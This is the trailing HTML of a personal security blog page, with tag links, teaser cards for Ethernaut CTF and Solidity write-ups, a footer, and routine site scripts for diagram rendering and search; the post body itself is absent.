class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/abnbc/">aBNBc</a> <a class="post-tag" href="/tags/aes-ecb/">AES-ECB</a> <a class="post-tag" href="/tags/bitcoin-protocols/">Bitcoin protocols</a> <a class="post-tag" href="/tags/bsc/">BSC</a> <a class="post-tag" href="/tags/eqn-solving/">eqn solving</a> <a class="post-tag" href="/tags/fwordctf/">FwordCTF</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Ethernaut-CTF-Writeups-Part-1/"><div class="card-body"> <em class="timeago small" date="2022-10-04 20:30:06 +0800" >Oct 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ethernaut CTF Writeups - Part 1</h3><div class="text-muted small"><p> I recently started attempting Ethernaut CTF challenges and it has been a great learning experience solving all these variety of challenges which cover a broad spectrum of topics in...</p></div></div></a></div><div class="card"> <a href="/posts/Ethernaut-CTF-Writeups-Part-2/"><div class="card-body"> <em class="timeago small" date="2022-10-04 20:30:06 +0800" >Oct 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ethernaut CTF Writeups - Part 2</h3><div class="text-muted small"><p> Continuing from where we left of…… ___ Level 7 [Force] This challenge appraises on a certain unconventional way of sending ether to a contract. To send ether as we normally do vi...</p></div></div></a></div><div class="card"> <a href="/posts/How-Not-To-Use-Custom-Errors/"><div class="card-body"> <em class="timeago small" date="2022-11-06 20:30:06 +0800" >Nov 6, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How Not To Use Custom Errors</h3><div class="text-muted small"><p> Good Samaritan Overview This challenge focuses on a relatively new feature introduced recently in solidity known as custom errors used for better error handling. The challenge is...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/How-Not-To-Use-Custom-Errors/" class="btn btn-outline-primary" prompt="Older"><p>How Not To Use Custom Errors</p></a> <a href="/posts/Ankr-aBNBc-Token-Exploit/" class="btn btn-outline-primary" prompt="Newer"><p>Ankr aBNBc Token Exploit</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://www.linkedin.com/in/vishvesh-rao-847368191">Vishvesh_R</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ethereum/">Ethereum</a> <a class="post-tag" href="/tags/solidity/">Solidity</a> <a class="post-tag" href="/tags/crypto/">Crypto</a> <a class="post-tag" href="/tags/rsa/">RSA</a> <a class="post-tag" href="/tags/abnbc/">aBNBc</a> <a class="post-tag" href="/tags/aes-ecb/">AES-ECB</a> <a class="post-tag" href="/tags/bitcoin-protocols/">Bitcoin protocols</a> <a class="post-tag" href="/tags/bsc/">BSC</a> <a class="post-tag" href="/tags/eqn-solving/">eqn solving</a> <a class="post-tag" href="/tags/fwordctf/">FwordCTF</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
